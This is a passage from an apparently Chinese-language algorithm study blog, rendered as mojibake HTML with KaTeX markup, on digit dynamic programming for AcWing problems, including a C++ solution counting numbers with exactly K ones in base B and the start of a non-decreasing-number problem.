mtight">4</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>ï¼Œæ¥ä¸‹æ¥ä¸¤è¡ŒåŒ…å«æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>åªåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ»¡è¶³æ¡ä»¶çš„æ•°çš„ä¸ªæ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>X</mi><mo>â‰¤</mo><mi>Y</mi><mo>â‰¤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \le X \le Y \le 2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>K</mi><mo>â‰¤</mo><mn>20</mn></mrow><annotation encoding="application/x-tex">1 \le K \le 20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">20</span></span></span></span>,<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>â‰¤</mo><mi>B</mi><mo>â‰¤</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">2 \le B \le 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>15 2022</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>3</code></pre><h3 id="æ•°ä½DP-2">æ•°ä½DP</h3><p><strong>æ ‘åˆ†æ”¯</strong></p><p>åªæœ‰å½“å‰ä½ä¸Šæ•°å¤§äº0æ‰å­˜åœ¨å·¦å³åˆ†æ”¯</p><p>å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> æ—¶ï¼Œå·¦æ”¯ä¸€å®šä¼šå­˜åœ¨ï¼šå·¦æ”¯å– <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>x</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\sim x-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>, å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x&gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> æ—¶ï¼Œå·¦æ”¯è‡³å°‘å¯ä»¥å–0</p><p>å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> æ—¶ï¼Œå³æ”¯ä¸èƒ½å­˜åœ¨ï¼Œå·¦æ”¯ä¸­å¯ä»¥å†å–0ï¼šå½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x&gt;1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> æ—¶ï¼ŒæŒ‰ç…§æ•°å‹ç»“æ„æ­¤å±‚å°±å¾—å– <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span>ï¼Œè€Œé¢˜ç›®ä¸­è§„å®šçš„æ˜¯**â€œæ°å¥½ç­‰äºâ€**ï¼Œå³æ¯ä¸€ä¸ºä¸Šæ•°å­—å¿…é¡»å–0æˆ–1ï¼Œæ‰€ä»¥å³åˆ†æ”¯ä¸èƒ½ç»§ç»­å¾€ä¸‹èµ°äº†ã€‚</p><p>å½“ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> æ—¶ï¼Œå³æ”¯å–1ï¼ˆå·¦æ”¯å– <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><mi>x</mi><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0\sim x -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> å°±ä¸èƒ½å†å–å•¦ï¼‰ï¼Œæ²¿å³æ”¯è¿›å…¥ä¸‹ä¸€å±‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">35</span>;</span><br><span class="line"><span class="type">int</span> K, B;</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¡ç®—f[i][j]: C_a^b</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; kN; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!j) &#123;</span><br><span class="line">        f[i][j] = <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        f[i][j] = f[i - <span class="number">1</span>][j] + f[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dp</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// K &gt;= 1</span></span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">  <span class="keyword">while</span> (n) &#123;</span><br><span class="line">    nums.<span class="built_in">push_back</span>(n % B);  <span class="comment">// Bè¿›åˆ¶, è€Œéåè¿›åˆ¶</span></span><br><span class="line">    n /= B;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> last = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = nums.<span class="built_in">size</span>() - <span class="number">1</span>; ~i; i--) &#123;  <span class="comment">// ~iç­‰ä»·äºi != -1</span></span><br><span class="line">    <span class="type">int</span> x = nums[i];</span><br><span class="line">    <span class="keyword">if</span> (x) &#123;  <span class="comment">// å½“å‰å€¼å¤§äº0æ‰ä¼šå­˜åœ¨å·¦å³åˆ†æ”¯</span></span><br><span class="line">      res += f[i][K - last];  <span class="comment">// a_&#123;n-1&#125;é€‰0, a_&#123;n-2&#125;åˆ°a_0æœ‰i=n-1ä¸ªæ•°</span></span><br><span class="line">      <span class="keyword">if</span> (x &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (K - last - <span class="number">1</span> &gt;= <span class="number">0</span>) res += f[i][K - last - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">break</span>;  <span class="comment">// x&gt;1æ—¶, å³åˆ†æ”¯a_&#123;n-1&#125;æ²¡æ³•å¾€ä¸‹èµ°</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;  <span class="comment">// x=1æ—¶, æˆä¸ºå³åˆ†æ”¯å¾€ä¸‹ä¸€å±‚èµ°</span></span><br><span class="line">        last++;</span><br><span class="line">        <span class="keyword">if</span> (last &gt; K) <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!i &amp;&amp; last == K) res++;  <span class="comment">// æ•´æ£µæ ‘å”¯ä¸€çš„å³æ ¹</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">init</span>();</span><br><span class="line">  <span class="type">int</span> l, r;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d%d&quot;</span>, &amp;l, &amp;r, &amp;K, &amp;B);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">dp</span>(r) - <span class="built_in">dp</span>(l - <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-1082-æ•°å­—æ¸¸æˆ"><a href="https://www.acwing.com/problem/content/1084/">AcWing 1082. æ•°å­—æ¸¸æˆ</a></h2><p>ç§‘åé‡Œæœ€è¿‘å¾ˆæµè¡Œæ•°å­—æ¸¸æˆã€‚</p><p>æŸäººå‘½åäº†ä¸€ç§ä¸é™æ•°ï¼Œè¿™ç§æ•°å­—å¿…é¡»æ»¡è¶³ä»å·¦åˆ°å³å„ä½æ•°å­—å‘ˆéä¸‹é™å…³ç³»ï¼Œå¦‚ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>123</mn></mrow><annotation encoding="application/x-tex">123</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">123</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>446</mn></mrow><annotation encoding="application/x-tex">446</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">446</span></span></span></span>ã€‚</p><p>ç°åœ¨å¤§å®¶å†³å®šç©ä¸€ä¸ªæ¸¸æˆï¼ŒæŒ‡å®šä¸€ä¸ªæ•´æ•°é—­åŒºé—´ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a,b]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span></span></span></span>ï¼Œé—®è¿™ä¸ªåŒºé—´å†…æœ‰å¤šå°‘ä¸ªä¸é™æ•°ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ã€‚</p><p>æ¯ç»„æ•°æ®å ä¸€è¡Œï¼ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> å’Œ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>æ¯è¡Œç»™å‡ºä¸€ç»„æµ‹è¯•æ•°æ®çš„ç­”æ¡ˆï¼Œå³ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[a,b]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span></span></span></span> ä¹‹é—´æœ‰å¤šå°‘ä¸é™æ•°ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>a</mi><mo>â‰¤</mo><mi>b</mi><mo>â‰¤</mo><msup><mn>2</mn><mn>31</mn></msup><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">1 \le a \le b \le 2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹ï¼š</strong></p><pre><code>1 91 19</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>918</code></pre><h3 id="æ•°ä½dp">æ•°ä½dp</h3><p>æ ¹æ®æ¯ä¸€ä½<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>çš„å€¼å¯åˆ†ä¸ºå·¦å³ä¸¤æ”¯ï¼š</p><ul><li><strong>å·¦æ”¯</strong> æœ€é«˜ä½å–<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>âˆ¼</mo><msub><mi>a</mi><mi>n</mi></msub><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">0 \sim a_n -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼ˆå…¶å®æ˜¯<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>&lt;</mo><mi>l</mi><mi>a</mi><mi>s</mi><mi>t</mi><mo>&gt;</mo><mo>âˆ¼</mo><msub><mi>a</mi><mi>n</mi></msub><mo>âˆ’</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">&lt;last&gt; \sim a_n -1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>ï¼‰ï¼Œä½ä½æ— é™åˆ¶ï¼Œå¯ä»¥<strong>é¢„è®¡ç®—</strong></li><li><strong>å³æ”¯</strong> æœ€é«˜ä¸ºå–<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">a_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œä½ä½æœ‰é™åˆ¶ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†æ”¯</li></ul><p><img src="/2022/12/01/%E7%AE%97%E6%B3%95-AcWing%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98%E8%AF%BE-%E7%AC%AC1-8%E8%AE%B2-%E6%95%B0%E4%BD%8DDP/image-20221212195232246.png" alt></p><p><img 